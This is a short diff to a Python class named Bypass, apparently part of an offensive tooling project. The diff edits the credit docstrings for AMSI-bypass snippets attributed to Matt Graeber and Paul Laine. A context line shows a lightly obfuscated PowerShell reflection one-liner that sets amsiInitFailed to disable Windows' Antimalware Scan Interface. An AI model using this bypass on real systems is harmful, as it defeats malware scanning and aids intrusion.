@@ -16,7 +16,7 @@ class Bypass:
         else:
             raise SystemExit("Not supported bypass type")
 
-    """ This code has been obtained from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and it 
+    """ This code has been obtained from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and 
     the credits are from Matt Graeber, who published this code on May 25th 2016 
     (https://twitter.com/mattifestation/status/735261120487772160). It has been changed a little
     bit for it to work properly. """
@@ -32,7 +32,7 @@ class Bypass:
             '[Ref].Assembly.GetType("System.Management.Automation.Am$var1").GetField("amsiI$var2","NonPublic,Static").SetValue($null,$true)\n'
         return code
 
-    """ This code has been obtained from https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell and it 
+    """ This code has been obtained from https://www.contextis.com/us/blog/amsi-bypass and 
     the credits are from Paul Laine (@am0nsec) """
 
     def get_laine_code(self):
